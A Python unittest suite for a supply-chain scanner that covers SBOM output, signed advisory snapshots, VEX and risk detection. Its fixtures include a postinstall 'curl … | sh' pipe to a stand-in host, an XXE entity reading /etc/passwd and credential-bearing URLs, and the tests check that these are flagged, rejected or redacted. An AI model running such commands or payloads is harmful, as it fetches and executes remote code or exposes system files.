import contextlib
import base64
import datetime
import io
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import supply_chain_center as scc
import supply_chain35


UTC = datetime.timezone.utc


class SupplyChainCenterTests(unittest.TestCase):
    def write(self, root: Path, name: str, content: str | bytes) -> Path:
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def snapshot(self, now: datetime.datetime, *, expires_delta: int | None = 86400):
        value = {
            "schema": scc.SNAPSHOT_SCHEMA,
            "generated_at": now.isoformat().replace("+00:00", "Z"),
            "source": {"name": "deterministic-test-feed", "url": "https://example.invalid/feed"},
            "advisories": [{
                "id": "TEST-2026-0001",
                "package": {"ecosystem": "npm", "name": "left-pad"},
                "versions": ["1.3.0"],
                "ranges": [{"introduced": "2.0.0", "fixed": "2.2.0"}],
                "fixed_versions": ["2.2.0"],
                "severity": "high",
                "summary": "fixture advisory",
            }],
        }
        if expires_delta is not None:
            value["expires_at"] = (now + datetime.timedelta(seconds=expires_delta)).isoformat().replace("+00:00", "Z")
        return value

    def test_purl_normalization_and_validation(self):
        self.assertEqual(scc.make_purl("pypi", "Requests_Plus", "==2.32.0"),
                         "pkg:pypi/requests-plus@2.32.0")
        self.assertEqual(scc.make_purl("npm", "@Scope/Widget", "1.2.3"),
                         "pkg:npm/%40scope/widget@1.2.3")
        self.assertEqual(scc.make_purl("maven", "org.example:core", "4.0.0"),
                         "pkg:maven/org.example/core@4.0.0")
        self.assertEqual(scc.make_purl("golang", "example.invalid/lib", "v1.2.3"),
                         "pkg:golang/example.invalid/lib@v1.2.3")
        self.assertEqual(scc.make_purl("npm", "left-pad", "^1.3.0"), "pkg:npm/left-pad")
        with self.assertRaises(scc.SupplyChainError):
            scc.make_purl("not a type", "widget")
        with self.assertRaises(scc.SupplyChainError):
            scc.make_purl("npm", "../escape")

    def test_inventory_many_ecosystems_and_lock_evidence(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "Requests_Plus==2.32.0 --hash=sha256:abcd\n")
            self.write(root, "Pipfile", '[packages]\nhttpx = "==0.28.0"\n')
            self.write(root, "Pipfile.lock", '{"default":{"httpx":{"version":"==0.28.0"}}}')
            self.write(root, "package.json", json.dumps({"dependencies": {"left-pad": "1.3.0"}}))
            self.write(root, "package-lock.json", json.dumps({
                "lockfileVersion": 3,
                "packages": {"": {}, "node_modules/left-pad": {
                    "name": "left-pad", "version": "1.3.0",
                    "resolved": "https://registry.invalid/left-pad.tgz",
                    "integrity": "sha512-nothex", "license": "MIT",
                }},
            }))
            self.write(root, "Cargo.lock", 'version = 3\n[[package]]\nname = "serde"\nversion = "1.0.203"\nchecksum = "abcd"\n')
            self.write(root, "go.mod", "module example.invalid/app\nrequire example.invalid/lib v1.2.3\n")
            self.write(root, "pom.xml", "<project><dependencies><dependency><groupId>org.example</groupId><artifactId>core</artifactId><version>4.0.0</version></dependency></dependencies></project>")
            self.write(root, "demo.csproj", '<Project><ItemGroup><PackageReference Include="Newtonsoft.Json" Version="13.0.3" /></ItemGroup></Project>')
            self.write(root, "composer.lock", json.dumps({"packages": [{
                "name": "acme/tool", "version": "1.0.0", "license": ["MIT"],
                "dist": {"shasum": "abcd"}, "source": {"url": "https://example.invalid/acme"},
            }]}))
            self.write(root, "Gemfile.lock", "GEM\n  specs:\n    rake (13.2.1)\n\nPLATFORMS\n  ruby\n")
            self.write(root, "Gemfile", 'source "https://rubygems.org"\ngem "rake", "13.2.1"\n')
            self.write(root, "Package.swift", '.package(url: "https://example.invalid/swift-log.git", exact: "1.5.4")\n')
            self.write(root, "Package.resolved", json.dumps({"pins": [{
                "identity": "swift-log", "location": "https://example.invalid/swift-log",
                "state": {"version": "1.5.4", "revision": "abc"},
            }]}))

            inventory = scc.inventory_workspace(root)
            self.assertFalse(inventory.errors, inventory.errors)
            ecosystems = {dep.ecosystem for dep in inventory.dependencies}
            self.assertTrue({"pypi", "npm", "cargo", "golang", "maven", "nuget",
                             "composer", "gem", "swift"} <= ecosystems)
            requests = next(dep for dep in inventory.dependencies
                            if dep.ecosystem == "pypi" and dep.name == "requests-plus")
            self.assertEqual(requests.name, "requests-plus")
            self.assertIn("sha256:abcd", requests.integrity)
            npm = next(dep for dep in inventory.dependencies if dep.ecosystem == "npm")
            self.assertTrue(npm.direct)
            self.assertEqual(npm.licenses, ("MIT",))
            self.assertEqual(npm.manifests, ("package-lock.json", "package.json"))
            self.assertEqual(len({dep.bom_ref for dep in inventory.dependencies}),
                             len(inventory.dependencies), "SBOM references must be unique")
            self.assertEqual(inventory.file_hashes, dict(sorted(inventory.file_hashes.items())))
            package_lock = next(row for row in inventory.lock_coverage if row["manifest"] == "package.json")
            self.assertEqual(package_lock["status"], "present")
            self.assertEqual(inventory.to_dict()["status"], "complete")

    def test_declared_range_preserves_unknown_resolved_version(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", '{"dependencies":{"widget":"^2.0.0"}}')
            inventory = scc.inventory_workspace(root)
            dep = inventory.dependencies[0]
            self.assertEqual(dep.version, "")
            self.assertEqual(dep.version_spec, "^2.0.0")
            self.assertEqual(dep.purl, "pkg:npm/widget")
            component = scc.build_cyclonedx(inventory)["components"][0]
            self.assertNotIn("version", component)
            state = next(item for item in component["properties"] if item["name"] == "attestor:version-state")
            self.assertEqual(state["value"], "unknown")

    def test_deterministic_cyclonedx_and_spdx_outputs(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "flask==3.1.0\n")
            inventory = scc.inventory_workspace(root)
            first_cdx = scc.render_json(scc.build_cyclonedx(inventory, source_date_epoch=123))
            second_cdx = scc.render_json(scc.build_cyclonedx(inventory, source_date_epoch=123))
            self.assertEqual(first_cdx, second_cdx)
            cdx = json.loads(first_cdx)
            self.assertEqual(cdx["bomFormat"], "CycloneDX")
            self.assertEqual(cdx["specVersion"], "1.7")
            self.assertEqual(cdx["$schema"], "https://cyclonedx.org/schema/bom-1.7.schema.json")
            spdx = scc.build_spdx(inventory, source_date_epoch=123)
            self.assertEqual(spdx["@context"], "https://spdx.org/rdf/3.0.1/spdx-context.jsonld")
            self.assertFalse(scc.validate_spdx_3_shape(spdx))
            creation = next(item for item in spdx["@graph"] if item["type"] == "CreationInfo")
            self.assertEqual(creation["specVersion"], "3.0.1")
            package = next(item for item in spdx["@graph"]
                           if item["type"] == "software_Package" and item.get("software_packageUrl"))
            self.assertEqual(package["software_packageUrl"], "pkg:pypi/flask@3.1.0")
            legacy = scc.build_spdx_2_3(inventory, source_date_epoch=123)
            self.assertEqual(legacy["spdxVersion"], "SPDX-2.3")
            self.assertTrue(legacy["documentNamespace"].startswith("https://attestor.local/spdx/"))

    def test_spdx_3_models_hash_license_and_dependency_relationships(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package-lock.json", json.dumps({"packages": {
                "node_modules/left-pad": {
                    "name": "left-pad", "version": "1.3.0",
                    "integrity": "sha512-" + base64.b64encode(b"a" * 64).decode("ascii"),
                    "license": "MIT",
                },
            }}))
            spdx = scc.build_spdx(scc.inventory_workspace(root), source_date_epoch=0)
            self.assertEqual(scc.validate_spdx_3_shape(spdx), [])
            package = next(item for item in spdx["@graph"]
                           if item["type"] == "software_Package" and item.get("software_packageUrl"))
            self.assertEqual(package["verifiedUsing"], [{
                "type": "Hash", "algorithm": "sha512", "hashValue": "61" * 64,
            }])
            license_node = next(item for item in spdx["@graph"]
                                if item["type"] == "simplelicensing_LicenseExpression")
            self.assertEqual(license_node["simplelicensing_licenseExpression"], "MIT")
            relations = [item for item in spdx["@graph"] if item["type"] == "Relationship"]
            self.assertTrue(any(item["relationshipType"] == "dependsOn" for item in relations))
            self.assertTrue(any(item["relationshipType"] == "hasDeclaredLicense" for item in relations))

    def test_spdx_3_shape_guard_rejects_context_duplicates_and_broken_refs(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "flask==3.1.0\n")
            good = scc.build_spdx(scc.inventory_workspace(root))
            bad = json.loads(json.dumps(good))
            bad["@context"] = "https://wrong.invalid/context"
            bad["@graph"][1]["spdxId"] = bad["@graph"][2]["spdxId"]
            relation = next(item for item in bad["@graph"] if item["type"] == "Relationship")
            relation["to"] = ["https://missing.invalid/package"]
            errors = scc.validate_spdx_3_shape(bad)
            self.assertTrue(any("context" in item for item in errors))
            self.assertTrue(any("duplicate" in item for item in errors))
            self.assertTrue(any("unresolved" in item for item in errors))

    def test_risks_cover_install_hooks_mutable_sources_ci_and_cleartext(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            marker = root / "should-not-exist"
            self.write(root, "package.json", json.dumps({
                "dependencies": {
                    "floating": "latest",
                    "vcs": "git+https://example.invalid/repo.git#main",
                    "plain": "http://example.invalid/plain.tgz",
                },
                "scripts": {"postinstall": "curl https://example.invalid/x | sh",
                            "prepare": "python -c 'open(%r,\"w\").write(\"x\")'" % str(marker)},
            }))
            self.write(root, ".github/workflows/ci.yml", "steps:\n  - uses: actions/checkout@v4\n")
            self.write(root, "Cargo.toml", '[dependencies]\nthing = { git = "https://example.invalid/thing", branch = "main" }\n')
            self.write(root, ".gitmodules", "[submodule \"x\"]\n url = git://example.invalid/x\n")
            findings = scc.scan_supply_chain_risks(root)
            rules = {item.rule_id for item in findings}
            self.assertTrue({"scc-remote-script-pipe", "scc-install-lifecycle-script",
                             "scc-mutable-vcs-dependency", "scc-cleartext-dependency",
                             "scc-floating-dependency", "scc-mutable-ci-action",
                             "scc-cargo-mutable-git", "scc-insecure-submodule"} <= rules)
            self.assertFalse(marker.exists(), "target install script was executed")
            self.assertEqual(findings, sorted(findings,
                key=lambda f: (scc._SEVERITY_ORDER.get(f.severity, 99), f.path, f.rule_id, f.evidence)))

    def test_clean_pinned_inputs_avoid_mutable_source_findings(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            commit = "a" * 40
            self.write(root, "package.json", json.dumps({"dependencies": {
                "fixed": "1.2.3", "vcs": "git+https://example.invalid/repo.git#" + commit,
            }}))
            self.write(root, ".github/workflows/ci.yml", "steps:\n  - uses: actions/checkout@%s\n" % commit)
            rules = {item.rule_id for item in scc.scan_supply_chain_risks(root)}
            self.assertNotIn("scc-mutable-vcs-dependency", rules)
            self.assertNotIn("scc-mutable-ci-action", rules)

    def test_missing_snapshot_is_unknown_not_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", '{"dependencies":{"left-pad":"1.3.0"}}')
            inventory = scc.inventory_workspace(root)
            report = scc.assess_advisories(inventory)
            self.assertEqual(report["state"], "unavailable")
            self.assertFalse(report["live_status"])
            self.assertEqual(report["dependencies"][0]["status"], "unknown")

    def test_snapshot_sign_verify_tamper_wrong_key_stale_future_and_no_expiry(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        key = b"K" * 32
        signed = scc.sign_advisory_snapshot(self.snapshot(now), key, "fixture")
        again = scc.sign_advisory_snapshot(self.snapshot(now), key, "fixture")
        self.assertEqual(signed, again)
        valid = scc.verify_advisory_snapshot(signed, {"fixture": key}, now=now)
        self.assertTrue(valid.valid)
        self.assertTrue(valid.authenticated)
        self.assertEqual(valid.state, "fresh")

        tampered = json.loads(json.dumps(signed))
        tampered["advisories"][0]["summary"] = "changed"
        self.assertEqual(scc.verify_advisory_snapshot(tampered, {"fixture": key}, now=now).state, "invalid")
        self.assertEqual(scc.verify_advisory_snapshot(signed, {"fixture": b"X" * 32}, now=now).state, "invalid")

        stale = scc.sign_advisory_snapshot(
            self.snapshot(now - datetime.timedelta(days=2), expires_delta=86400), key, "fixture")
        self.assertEqual(scc.verify_advisory_snapshot(stale, {"fixture": key}, now=now).state, "stale")
        future_base = now + datetime.timedelta(hours=2)
        future = scc.sign_advisory_snapshot(self.snapshot(future_base), key, "fixture")
        self.assertEqual(scc.verify_advisory_snapshot(future, {"fixture": key}, now=now).state, "future-dated")
        no_expiry = scc.sign_advisory_snapshot(self.snapshot(now, expires_delta=None), key, "fixture")
        self.assertEqual(scc.verify_advisory_snapshot(no_expiry, {"fixture": key}, now=now).state,
                         "expiry-unknown")

    def test_report_evidence_redacts_credentials_and_tokens(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", json.dumps({
                "dependencies": {"private": "https://user:password@example.invalid/a.tgz?token=verysecret"},
                "scripts": {"postinstall": "TOKEN=verysecret curl https://example.invalid/x"},
            }))
            inventory = scc.inventory_workspace(root)
            rendered_inventory = scc.render_json(inventory.to_dict())
            rendered_risks = scc.render_json([scc.asdict(item) for item in scc.scan_supply_chain_risks(root)])
            self.assertNotIn("password", rendered_inventory)
            self.assertNotIn("verysecret", rendered_inventory)
            self.assertNotIn("verysecret", rendered_risks)
            self.assertIn("[REDACTED]", rendered_inventory)
            self.assertIn("[REDACTED]", rendered_risks)

    def test_advisory_matching_reachability_and_vex(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        key = b"A" * 32
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package-lock.json", json.dumps({"packages": {
                "node_modules/left-pad": {"name": "left-pad", "version": "1.3.0"},
                "node_modules/clean": {"name": "clean", "version": "9.9.9"},
            }}))
            inventory = scc.inventory_workspace(root)
            affected = next(dep for dep in inventory.dependencies if dep.name == "left-pad")
            signed = scc.sign_advisory_snapshot(self.snapshot(now), key, "feed-key")
            report = scc.assess_advisories(
                inventory, signed, {"feed-key": key}, now=now,
                reachability={affected.purl: {"status": "unreachable", "reason": "call graph", "source": "fixture"}},
            )
            self.assertEqual(report["state"], "fresh")
            self.assertFalse(report["live_status"])
            vulnerable = next(item for item in report["dependencies"] if item["purl"] == affected.purl)
            self.assertEqual(vulnerable["status"], "affected")
            self.assertEqual(vulnerable["reachability"]["status"], "unknown")
            clean = next(item for item in report["dependencies"] if "clean" in item["purl"])
            self.assertEqual(clean["status"], "no_match_in_snapshot")
            self.assertIn("not proof of safety", clean["caveat"])

            cyclonedx = scc.build_cyclonedx_vex(inventory, report)
            self.assertEqual(cyclonedx["vulnerabilities"][0]["analysis"]["state"], "in_triage")
            openvex = scc.build_openvex(inventory, report)
            self.assertEqual(openvex["statements"][0]["status"], "under_investigation")
            self.assertNotIn("justification", openvex["statements"][0])

            proof = supply_chain35.make_reachability_proof(
                affected.purl, reachable=False,
                entrypoints=["<all-observed-entrypoints>", "route:/"], call_chains=[],
                analysis_sha256="a" * 64, inventory_sha256="b" * 64)
            verified_report = scc.assess_advisories(
                inventory, signed, {"feed-key": key}, now=now,
                reachability={affected.purl: {"status": "unreachable", "source": "fixture",
                                              "proof": proof}},
            )
            verified_vex = scc.build_openvex(inventory, verified_report)
            self.assertEqual(verified_vex["statements"][0]["status"], "not_affected")
            self.assertEqual(verified_vex["statements"][0]["justification"],
                             "vulnerable_code_not_in_execute_path")

    def test_range_advisory_match(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        key = b"R" * 32
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package-lock.json", json.dumps({"packages": {
                "node_modules/left-pad": {"name": "left-pad", "version": "2.1.0"},
            }}))
            inventory = scc.inventory_workspace(root)
            signed = scc.sign_advisory_snapshot(self.snapshot(now), key, "range")
            report = scc.assess_advisories(inventory, signed, {"range": key}, now=now)
            self.assertEqual(report["dependencies"][0]["status"], "affected")

    def test_unsupported_version_range_is_unknown_not_a_clean_result(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        key = b"U" * 32
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package-lock.json", json.dumps({"packages": {
                "node_modules/left-pad": {"name": "left-pad", "version": "release-blue"},
            }}))
            inventory = scc.inventory_workspace(root)
            signed = scc.sign_advisory_snapshot(self.snapshot(now), key, "range")
            report = scc.assess_advisories(inventory, signed, {"range": key}, now=now)
            self.assertEqual(report["dependencies"][0]["status"], "range_evaluation_unknown")

    def test_invalid_snapshot_never_drives_findings(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", '{"dependencies":{"left-pad":"1.3.0"}}')
            inventory = scc.inventory_workspace(root)
            unsigned = self.snapshot(now)
            report = scc.assess_advisories(inventory, unsigned, {})
            self.assertEqual(report["state"], "invalid")
            self.assertEqual(report["dependencies"][0]["status"], "unknown")
            self.assertEqual(report["dependencies"][0]["advisories"], [])

    def test_reachability_hook_exception_preserves_unknown(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "flask==3.1.0\n")
            inventory = scc.inventory_workspace(root)
            evidence = scc.run_reachability_hook(inventory, lambda _dep: 1 / 0)
            item = evidence[inventory.dependencies[0].purl]
            self.assertEqual(item["status"], "unknown")
            self.assertEqual(item["source"], "hook-error")
            self.assertIn("ZeroDivisionError", item["reason"])

    def test_provenance_is_explicitly_evidence_not_certification(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package-lock.json", json.dumps({"packages": {
                "node_modules/left-pad": {"name": "left-pad", "version": "1.3.0",
                                          "integrity": "sha512-value", "license": "MIT"},
            }}))
            inventory = scc.inventory_workspace(root)
            evidence = scc.build_provenance_evidence(inventory, [], source_date_epoch=0)
            self.assertEqual(evidence["predicateType"], "https://slsa.dev/provenance/v1")
            self.assertIn("not a SLSA certification", evidence["attestorEvidence"]["claim"])
            self.assertEqual(evidence["predicate"]["buildDefinition"]["externalParameters"]["network"],
                             "disabled-by-design")
            self.assertEqual(evidence["attestorEvidence"]["license_evidence"]["declared"], 1)

    def test_malformed_duplicate_json_xml_entity_and_invalid_utf8_are_bounded_errors(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", '{"dependencies":{},"dependencies":{}}')
            self.write(root, "pom.xml", '<!DOCTYPE x [<!ENTITY y SYSTEM "file:///etc/passwd">]><project>&y;</project>')
            self.write(root, "requirements.txt", b"flask==3.1.0\xff")
            inventory = scc.inventory_workspace(root)
            self.assertEqual(len(inventory.errors), 3)
            joined = "\n".join(inventory.errors)
            self.assertIn("duplicate JSON key", joined)
            self.assertIn("DTD/entity", joined)
            self.assertIn("valid UTF-8", joined)
            self.assertEqual(inventory.to_dict()["status"], "partial")

    def test_json_nesting_guard_and_duplicate_advisory_guard(self):
        nested: object = "leaf"
        for _ in range(scc.MAX_JSON_DEPTH + 2):
            nested = [nested]
        with self.assertRaises(scc.SupplyChainError):
            scc._safe_json_depth(nested)
        with self.assertRaises(scc.SupplyChainError):
            scc._json_loads("[" * 2000 + "0" + "]" * 2000)
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        snapshot = self.snapshot(now)
        snapshot["advisories"].append(dict(snapshot["advisories"][0]))
        with self.assertRaises(scc.SupplyChainError):
            scc.sign_advisory_snapshot(snapshot, b"K" * 32, "fixture")

    def test_file_and_dependency_limits_report_partial_results(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "a==1\nb==2\nc==3\n")
            with mock.patch.object(scc, "MAX_MANIFEST_BYTES", 4):
                inventory = scc.inventory_workspace(root)
            self.assertTrue(inventory.errors)
            self.assertIn("exceeds 4 bytes", inventory.errors[0])
            with mock.patch.object(scc, "MAX_DEPENDENCIES", 1):
                inventory = scc.inventory_workspace(root)
            self.assertTrue(any("dependency limit" in item for item in inventory.errors))
            self.assertLessEqual(len(inventory.dependencies), 1)

    def test_risk_finding_limit_is_explicit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "package.json", json.dumps({
                "dependencies": {"one": "latest", "two": "latest", "three": "latest"},
            }))
            with mock.patch.object(scc, "MAX_FINDINGS", 1):
                findings = scc.scan_supply_chain_risks(root)
            self.assertLessEqual(len(findings), 2)
            self.assertIn("scc-finding-limit", {item.rule_id for item in findings})

    def test_symlinked_manifest_is_not_followed(self):
        with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as outside:
            root = Path(tmp)
            target = self.write(Path(outside), "package.json", '{"dependencies":{"outside":"1.0.0"}}')
            link = root / "package.json"
            try:
                link.symlink_to(target)
            except (OSError, NotImplementedError):
                self.skipTest("symlinks are unavailable for this account")
            inventory = scc.inventory_workspace(root)
            self.assertEqual(inventory.dependencies, [])
            self.assertEqual(inventory.manifests, [])

    def test_analyze_report_has_offline_contract_and_all_artifacts(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "flask==3.1.0\n")
            report = scc.analyze_workspace(root, source_date_epoch=0)
            self.assertEqual(report["schema"], scc.SCHEMA)
            self.assertEqual(report["execution"], {
                "network_access": False, "dependencies_installed": False,
                "target_code_executed": False, "mode": "offline-static",
            })
            self.assertEqual(report["advisory_assessment"]["state"], "unavailable")
            self.assertEqual(report["sbom"]["cyclonedx"]["bomFormat"], "CycloneDX")
            self.assertEqual(report["sbom"]["cyclonedx"]["specVersion"], "1.7")
            self.assertEqual(report["sbom"]["spdx"]["@context"],
                             "https://spdx.org/rdf/3.0.1/spdx-context.jsonld")
            self.assertEqual(report["sbom"]["spdx_2_3_legacy"]["spdxVersion"], "SPDX-2.3")
            self.assertIn("openvex", report["vex"])
            self.assertEqual(report["vex"]["openvex"]["state"], "not-generated")
            self.assertIn("provenance", report)

    def test_cli_inventory_sbom_sign_and_verify(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "requirements.txt", "flask==3.1.0\n")
            stdout = io.StringIO()
            with contextlib.redirect_stdout(stdout):
                code = scc.main(["inventory", str(root)])
            self.assertEqual(code, 0)
            self.assertEqual(json.loads(stdout.getvalue())["dependencies"][0]["name"], "flask")

            sbom_file = root / "sbom.json"
            self.assertEqual(scc.main(["sbom", str(root), "--format", "spdx", "-o", str(sbom_file)]), 0)
            self.assertEqual(json.loads(sbom_file.read_text(encoding="utf-8"))["@context"],
                             "https://spdx.org/rdf/3.0.1/spdx-context.jsonld")
            self.assertEqual(scc.main(["sbom", str(root), "--format", "spdx-2.3", "-o", str(sbom_file)]), 0)
            self.assertEqual(json.loads(sbom_file.read_text(encoding="utf-8"))["spdxVersion"], "SPDX-2.3")

            unsigned_file = root / "snapshot.json"
            signed_file = root / "signed.json"
            key_file = root / "snapshot.key"
            unsigned_file.write_text(json.dumps(self.snapshot(now)), encoding="utf-8")
            key_file.write_bytes(b"Z" * 32)
            self.assertEqual(scc.main(["sign-snapshot", str(unsigned_file), str(signed_file),
                                       "--hmac-key-file", str(key_file), "--key-id", "cli"]), 0)
            stdout = io.StringIO()
            with contextlib.redirect_stdout(stdout):
                code = scc.main(["verify-snapshot", str(signed_file),
                                 "--hmac-key-file", str(key_file), "--key-id", "cli"])
            self.assertEqual(code, 0)
            self.assertTrue(json.loads(stdout.getvalue())["valid"])

    def test_hmac_key_is_not_accepted_when_short(self):
        now = datetime.datetime(2026, 7, 11, 12, 0, tzinfo=UTC)
        with self.assertRaises(scc.SupplyChainError):
            scc.sign_advisory_snapshot(self.snapshot(now), b"short", "fixture")


if __name__ == "__main__":
    unittest.main()
